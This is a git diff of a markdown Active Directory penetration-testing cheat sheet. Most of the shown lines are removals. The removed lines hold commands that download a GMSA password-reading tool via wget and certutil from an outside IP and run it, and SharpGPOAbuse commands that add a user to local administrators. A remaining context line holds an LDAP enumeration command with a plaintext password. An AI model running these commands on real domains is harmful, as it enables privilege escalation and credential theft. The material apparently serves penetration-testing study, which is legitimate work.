@@ -696,9 +696,6 @@ git diff <commit hash>
 
 
 
-### ACLs
-
-[Abusing Active Directory ACLs/ACEs | Red Team Notes](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
 
 ***Generic All***
 
@@ -707,32 +704,8 @@ ldeep ldap -u tracy.white -p 'zqwj041FGX' -d ldap://nara-security.com -s 192.168
 ```
 
 
-**Generic All on Computer**: [**Resource Based Constrained Delegation Attack**](https://www.notion.so/Resource-Based-Constrained-Delegation-Attack-8003ef218a7e4cb2b7d0709521e85355?pvs=21) 
 
-***ReadGMSAPassword***
 
-```jsx
- wget https://github.com/CsEnox/tools/raw/main/GMSAPasswordReader.exe
- certutil -split -urlcache -f http://192.168.45.171/GMSAPasswordReader.exe
-.\GMSAPasswordReader.exe --AccountName svc_apache$
-```
-
-### GPOs
-
-```jsx
-Get-DomainGPOLocalGroup | select GPODisplayName, GroupName, GPOType
-```
-
-![Untitled](Cheat%20sheet%20b2ec1956b01746ed807a1363890b898f/Untitled.png)
-
-[SharpGPOAbuse/SharpGPOAbuse-master at main · byronkg/SharpGPOAbuse](https://github.com/byronkg/SharpGPOAbuse/tree/main/SharpGPOAbuse-master)
-
-```jsx
-.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName "DEFAULT DOMAIN POLICY"
-gpupdate /force
-# check if added to admin
-net localgroup administrators
-```
 
 ### Silver Ticket
 
